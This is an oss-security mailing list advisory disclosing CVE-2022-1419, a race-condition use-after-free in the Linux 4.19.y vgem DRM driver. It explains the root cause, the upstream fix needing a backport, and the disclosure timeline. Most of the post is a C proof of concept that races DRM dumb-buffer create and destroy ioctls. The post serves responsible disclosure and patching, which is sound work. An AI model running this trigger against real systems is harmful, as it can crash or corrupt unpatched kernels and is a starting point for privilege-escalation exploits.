@@ -1,0 +1,97 @@
+
+Date: Thu, 21 Apr 2022 23:44:54 +0800
+From: Minh Yuan <yuanmingbuaa@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: CVE-2022-1419: Linux kernel: A concurrency use-after-free in vgem_gem_dumb_create
+
+Hi guys,
+
+I recently discovered a race uaf in the latest 4.19.y kernel ( v4.19.239
+for now ).
+
+The root cause of this vulnerability is that the
+ioctl$DRM_IOCTL_MODE_DESTROY_DUMB can decrease refcount of
+*drm_vgem_gem_object *(created in *vgem_gem_dumb_create*) concurrently,
+and  *vgem_gem_dumb_create *will access the freed drm_vgem_gem_object.
+
+I noticed that this race issue is fixed in commit 4b848f2 (drm/vgem: Close
+use-after-free race in vgem_gem_create) for linux 5.x, so a backport to
+4.19.y is needed  ...
+
+My unstable PoC (tested on Linux 4.19.239, it needs the privilege to access
+drm to trigger this bug.)
+
+#include <endian.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <sys/stat.h>
+#include <sys/mman.h>
+#include <pthread.h>
+#include <sys/xattr.h>
+#include <sys/shm.h>
+#include <linux/userfaultfd.h>
+#include <poll.h>
+#include <sys/ioctl.h>
+#include <drm/drm.h>
+#include <drm/drm_mode.h>
+
+#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
+} while (0)
+int fd;
+void *thread1(void *arg)
+{
+struct drm_mode_create_dumb *args = (struct drm_mode_create_dumb *)malloc(
+sizeof(struct drm_mode_create_dumb));
+memset(args,0,sizeof(struct drm_mode_create_dumb));
+args->width = 10;
+args->height = 10;
+args->bpp = 1;
+ioctl(fd, DRM_IOCTL_MODE_CREATE_DUMB, args);
+}
+void *thread2(void *arg)
+{
+struct drm_mode_destroy_dumb *args = (struct drm_mode_destroy_dumb *)malloc(
+sizeof(struct drm_mode_destroy_dumb));
+memset(args,0,sizeof( struct drm_mode_destroy_dumb));
+args->handle = 1;
+ioctl(fd, DRM_IOCTL_MODE_DESTROY_DUMB, args);
+
+}
+
+int main(void)
+
+{
+pthread_t thr1,thr2;
+fd = open("/dev/dri/card0",0);
+
+int s = pthread_create(&thr1,NULL,thread1,(void*)NULL);
+if(s != 0)
+errExit("pthread_create");
+s = pthread_create(&thr2,NULL,thread2,(void*)NULL);
+if(s != 0)
+errExit("pthread_create");
+pthread_join(thr1,NULL);
+pthread_join(thr2,NULL);
+
+close(fd);
+
+}
+
+
+Timeline:
+* 21.04.22 - Vulnerability reported to security@...nel.org and
+linux-distros@...openwall.org
+* 21.04.22 - CVE-2022-1419 assigned.
+* 21.04.22 - Vulnerability opened.
+
+Regards,
+
+Yuan Ming from Tsinghua University
+
